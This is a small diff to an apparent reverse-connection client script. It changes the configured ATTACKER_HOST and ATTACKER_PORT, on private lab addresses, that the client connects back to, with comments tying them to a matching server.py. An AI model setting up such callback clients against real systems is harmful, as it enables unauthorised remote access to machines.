@@ -1003,8 +1003,8 @@ if __name__ == "__main__":
     print("=" * 70)
     
     # Configuration - Change these to match your attacker machine
-    ATTACKER_HOST = '192.168.0.100'  # Change to attacker's IP address
-    ATTACKER_PORT = 5557            # Must match port in server.py
+    ATTACKER_HOST = '192.168.0.107'  # Change to attacker's IP address
+    ATTACKER_PORT = 5558            # Must match port in server.py
     
     print(f"\n[*] Configured to connect to: {ATTACKER_HOST}:{ATTACKER_PORT}")
     print("[*] Starting connection attempts...")
